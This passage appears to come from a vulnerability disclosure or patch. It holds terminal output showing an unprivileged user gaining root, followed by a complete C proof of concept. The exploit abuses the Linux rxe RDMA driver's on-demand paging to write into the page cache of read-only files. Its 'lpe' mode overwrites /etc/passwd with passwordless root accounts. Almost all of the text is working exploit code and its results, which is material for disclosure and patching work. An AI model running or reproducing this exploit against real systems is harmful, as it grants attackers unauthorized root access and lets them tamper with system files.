+[*] payload src first 64 bytes: attacker::0:0::/root:/bin/sh
+root::0:0::/root:/bin/sh
+testuser:x
+[*] trying gid_index=1 gid=0000:...fb
+[+] QPs connected
+[+] RDMA WRITE completed without faulting the read-only mapping
+[*] victim mmap first 64 bytes after write: attacker::0:0::/root:/bin/sh
+root::0:0::/root:/bin/sh
+testuser:x
+[*] victim[128..176] after write: :adm:/var/adm:/usr/sbin/nologin
+lp:x:4:7:lp:/var
+[+] SUCCESS: page cache of read-only file /etc/passwd overwritten!
+[+] first 64 bytes now: attacker::0:0::/root:/bin/sh
+root::0:0::/root:/bin/sh
+testuser:x
+
+bash-5.3$
+bash-5.3$ id
+uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
+context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+bash-5.3$ su root
+sh-5.3# id
+uid=0(attacker) gid=0(root) groups=0(root)
+context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+```
+
+PoC:
+```c
+// PoC: rxe ODP writes into a read-only-mapped page-cache page
+(Dirty-COW-class).
+// Unprivileged user: ibv_reg_mr(IBV_ACCESS_ON_DEMAND|REMOTE_WRITE) over a
+// PROT_READ/MAP_PRIVATE file mapping, then RDMA WRITE lands in the page cache.
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+#include <sys/mman.h>
+#include <infiniband/verbs.h>
+
+#define PGSZ 4096
+
+static void die(const char *m) { perror(m); exit(1); }
+
+static int gid_is_v4mapped(const union ibv_gid *g)
+{
+    return !memcmp(g->raw, "\0\0\0\0\0\0\0\0\0\0\xff\xff", 12) &&
+           g->raw[12];
+}
+
+/* collect RoCE v2 gid indexes; IPv4-mapped gids first (their dmac
+ * resolution is trivial for a local self-connect, while fe80::/64
+ * link-local can fail ib_resolve_eth_dmac() with -ETIMEDOUT) */
+static int collect_rocev2_gids(struct ibv_context *ctx, const char *devname,
+                               union ibv_gid *gids, int *idxs, int maxn)
+{
+    char path[512], type[64];
+    int n = 0;
+    for (int pass = 0; pass < 2; pass++) {
+        for (int i = 0; i < 32 && n < maxn; i++) {
+            snprintf(path, sizeof(path),
+
+"/sys/class/infiniband/%s/ports/1/gid_attrs/types/%d", devname, i);
+            int fd = open(path, O_RDONLY);
+            if (fd < 0)
+                break;
+            int r = read(fd, type, sizeof(type) - 1);
+            close(fd);
+            if (r <= 0 || !strstr(type, "v2"))
+                continue;
+            union ibv_gid g;
+            if (ibv_query_gid(ctx, 1, i, &g))
+                continue;
+            int v4 = gid_is_v4mapped(&g);
+            if ((pass == 0 && v4) || (pass == 1 && !v4)) {
+                gids[n] = g;
+                idxs[n] = i;
+                n++;
+            }
+        }
+    }
+    return n;
+}
+
+static struct ibv_qp *make_qp(struct ibv_pd *pd, struct ibv_cq *cq)
+{
+    struct ibv_qp_init_attr qa = {
+        .send_cq = cq, .recv_cq = cq,
+        .cap = { .max_send_wr = 16, .max_recv_wr = 16,
+                 .max_send_sge = 4, .max_recv_sge = 4 },
+        .qp_type = IBV_QPT_RC,
+    };
+    struct ibv_qp *qp = ibv_create_qp(pd, &qa);
+    if (!qp) die("ibv_create_qp");
+    return qp;
+}
+
+static void qp_init(struct ibv_qp *qp)
+{
+    struct ibv_qp_attr a = {0};
+    a.qp_state = IBV_QPS_INIT;
+    a.pkey_index = 0;
+    a.port_num = 1;
+    a.qp_access_flags = IBV_ACCESS_REMOTE_WRITE | IBV_ACCESS_REMOTE_READ |
+                        IBV_ACCESS_REMOTE_ATOMIC;
+    int rc = ibv_modify_qp(qp, &a, IBV_QP_STATE | IBV_QP_PKEY_INDEX |
+                      IBV_QP_PORT | IBV_QP_ACCESS_FLAGS);
+    if (rc) { fprintf(stderr, "modify INIT: %s (%d)\n", strerror(rc),
+rc); exit(1); }
+}
+
+/* returns 0 on success, else the verbs error code (retryable with
+another gid) */
+static int qp_to_rts(struct ibv_qp *qp, uint32_t dest_qp_num,
+                     union ibv_gid gid, int gid_index)
+{
+    struct ibv_qp_attr a = {0};
+    int rc;
+
+    a.qp_state = IBV_QPS_RTR;
+    a.path_mtu = IBV_MTU_1024;
+    a.dest_qp_num = dest_qp_num;
+    a.rq_psn = 0;
+    a.max_dest_rd_atomic = 16;
+    a.min_rnr_timer = 12;
+    a.ah_attr.is_global = 1;
+    a.ah_attr.dlid = 0;
+    a.ah_attr.sl = 0;
+    a.ah_attr.src_path_bits = 0;
+    a.ah_attr.port_num = 1;
+    a.ah_attr.grh.dgid = gid;
+    a.ah_attr.grh.sgid_index = gid_index;
+    a.ah_attr.grh.hop_limit = 255;
+    rc = ibv_modify_qp(qp, &a, IBV_QP_STATE | IBV_QP_AV | IBV_QP_PATH_MTU |
+                      IBV_QP_DEST_QPN | IBV_QP_RQ_PSN |
+IBV_QP_MAX_DEST_RD_ATOMIC |
+                      IBV_QP_MIN_RNR_TIMER);
+    if (rc)
+        return rc;
+
+    memset(&a, 0, sizeof(a));
+    a.qp_state = IBV_QPS_RTS;
+    a.sq_psn = 0;
+    a.timeout = 14;
+    a.retry_cnt = 7;
+    a.rnr_retry = 7;
+    a.max_rd_atomic = 16;
+    { int rc = ibv_modify_qp(qp, &a, IBV_QP_STATE | IBV_QP_TIMEOUT |
+IBV_QP_RETRY_CNT |
+                      IBV_QP_RNR_RETRY | IBV_QP_SQ_PSN |
+IBV_QP_MAX_QP_RD_ATOMIC);
+      if (rc) { fprintf(stderr, "modify RTS: %s (%d)\n", strerror(rc),
+rc); exit(1); } }
+    return 0;
+}
+
+static void poll_ok(struct ibv_cq *cq)
+{
+    struct ibv_wc wc;
+    int n;
+    int tries = 0;
+    do {
+        n = ibv_poll_cq(cq, 1, &wc);
+        if (n < 0) die("poll_cq");
+        if (++tries > 1000000) { fprintf(stderr, "poll timeout\n"); exit(1); }
+    } while (n == 0);
+    if (wc.status != IBV_WC_SUCCESS) {
+        fprintf(stderr, "WC error: %s (%d)\n",
+ibv_wc_status_str(wc.status), wc.status);
+        exit(1);
+    }
+}
+
+int main(int argc, char **argv)
+{
+    const char *target = argc > 1 ? argv[1] : "/etc/passwd";
+    int lpe = argc > 2 && !strcmp(argv[2], "lpe");
+
+    /* 1. victim page-cache page, read-only, pre-populated */
+    int fd = open(target, O_RDONLY);
+    if (fd < 0) die("open target");
+    char *victim = mmap(NULL, PGSZ, PROT_READ, MAP_PRIVATE, fd, 0);
+    if (victim == MAP_FAILED) die("mmap");
+    madvise(victim, PGSZ, MADV_WILLNEED);
+    volatile char sink = victim[0]; /* install RO PTE pointing at page cache */
+    (void)sink;
+
+    char *orig = malloc(PGSZ);
+    memcpy(orig, victim, PGSZ);
+    printf("[*] target=%s first 32 bytes before: %.32s\n", target, victim);
+
+    /* 2. open rxe */
+    struct ibv_device **dl = ibv_get_device_list(NULL);
+    if (!dl) die("ibv_get_device_list");
+    struct ibv_context *ctx = NULL;
+    const char *devname = NULL;
+    for (int i = 0; dl[i]; i++)
+        if (!strncmp(ibv_get_device_name(dl[i]), "rxe", 3)) {
+            devname = ibv_get_device_name(dl[i]);
+            ctx = ibv_open_device(dl[i]);
+            break;
+        }
+    if (!ctx) { fprintf(stderr, "no rxe device\n"); return 1; }
+    printf("[*] using device %s\n", devname);
+
+    struct ibv_pd *pd = ibv_alloc_pd(ctx);
+    if (!pd) die("alloc_pd");
+    struct ibv_cq *cq = ibv_create_cq(ctx, 64, NULL, NULL, 0);
+    if (!cq) die("create_cq");
+
+    /* 3. THE malicious object: ODP MR with full perms over a
+PROT_READ mapping */
+    struct ibv_mr *vmr = ibv_reg_mr(pd, victim, PGSZ,
+        IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE |
+        IBV_ACCESS_REMOTE_READ | IBV_ACCESS_ON_DEMAND);
+    if (!vmr) die("reg_mr ODP victim");
+    printf("[+] ODP MR registered on PROT_READ file mapping:
+rkey=%#x\n", vmr->rkey);
+
+    /* 4. payload source MR (plain anonymous) */
+    char *src = mmap(NULL, PGSZ, PROT_READ | PROT_WRITE,
+                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (src == MAP_FAILED) die("mmap src");
+    memcpy(src, orig, PGSZ);
+    if (lpe) {
+        /* replace the whole file; readers stop at EOF so NUL padding is safe */
+        const char *hdr =
+            "attacker::0:0::/root:/bin/sh\n"
+            "root::0:0::/root:/bin/sh\n"
+            "testuser:x:1000:1000:test:/home/testuser:/bin/sh\n";
+        memcpy(src, hdr, strlen(hdr));
+    } else {
+        memcpy(src, "PWNED-via-rxe-ODP-CoW-bypass", 28); /* marker
+inside the file */
+    }
+    struct ibv_mr *smr = ibv_reg_mr(pd, src, PGSZ, IBV_ACCESS_LOCAL_WRITE);
+    if (!smr) die("reg_mr src");
+    printf("[*] payload src first 64 bytes: %.64s\n", src);
+
+    /* 5. two RC QPs self-connected over own GID;
+     * try each RoCEv2 gid (IPv4-mapped first) until dmac resolution succeeds */
+    union ibv_gid gids[32];
+    int idxs[32];
+    int ngids = collect_rocev2_gids(ctx, devname, gids, idxs, 32);
+    if (!ngids) { fprintf(stderr, "no RoCEv2 gid found\n"); return 1; }
+
+    int connected = 0, last_rc = 0;
+    struct ibv_qp *qa = NULL, *qb = NULL;
+    for (int i = 0; i < ngids && !connected; i++) {
+        printf("[*] trying gid_index=%d gid=%02x%02x:...%02x\n",
+               idxs[i], gids[i].raw[0], gids[i].raw[1], gids[i].raw[15]);
+        qa = make_qp(pd, cq);
+        qb = make_qp(pd, cq);
+        qp_init(qa);
+        qp_init(qb);
+        last_rc = qp_to_rts(qa, qb->qp_num, gids[i], idxs[i]);
+        if (!last_rc)
+            last_rc = qp_to_rts(qb, qa->qp_num, gids[i], idxs[i]);
+        if (last_rc) {
+            ibv_destroy_qp(qa);
+            ibv_destroy_qp(qb);
+            qa = qb = NULL;
+            continue;
+        }
+        connected = 1;
+    }
+    if (!connected) {
+        fprintf(stderr, "QP connect failed: %s (%d)\n",
+strerror(last_rc), last_rc);
+        return 1;
+    }
+    printf("[+] QPs connected\n");
+
+    /* 6. RDMA WRITE from qa straight into the victim MR (on responder qb).
+     * a single sub-MTU write; rxe reassembles multi-packet writes unreliably
+     * and the victim file fits in one write anyway */
+    {
+        struct ibv_sge sge = {
+            .addr = (uintptr_t)src, .length = 512, .lkey = smr->lkey,
+        };
+        struct ibv_send_wr wr = {
+            .opcode = IBV_WR_RDMA_WRITE,
+            .send_flags = IBV_SEND_SIGNALED,
+            .sg_list = &sge, .num_sge = 1,
+            .wr.rdma = { .remote_addr = (uintptr_t)victim, .rkey = vmr->rkey },
+        }, *bad = NULL;
+        if (ibv_post_send(qa, &wr, &bad)) die("post_send");
+        poll_ok(cq);
+    }
+    printf("[+] RDMA WRITE completed without faulting the read-only mapping\n");
+    sleep(1); /* let the responder land the write */
+    printf("[*] victim mmap first 64 bytes after write: %.64s\n", victim);
+    printf("[*] victim[128..176] after write: %.48s\n", victim + 128);
+    /* 7. verify: independent reader sees modified file content */
+    off_t fsz = lseek(fd, 0, SEEK_END);
+    size_t cmp = fsz > 0 && fsz < PGSZ ? (size_t)fsz : PGSZ;
+    int fd2 = open(target, O_RDONLY);
+    if (fd2 < 0) die("reopen");
+    char *now = calloc(1, PGSZ);
+    ssize_t nrd = pread(fd2, now, cmp, 0);
+    if (nrd != (ssize_t)cmp) die("pread");
+    if (memcmp(orig, now, cmp) == 0) {
+        printf("[-] primitive FAILED: file page cache unchanged\n");
+        return 1;
+    }
+    printf("[+] SUCCESS: page cache of read-only file %s
+overwritten!\n", target);
+    printf("[+] first 64 bytes now: %.64s\n", now);
+
+    /* keep the page hot briefly so an orchestrating script can act on it */
+    sleep(5);
+    return 0;
+}
+
+```
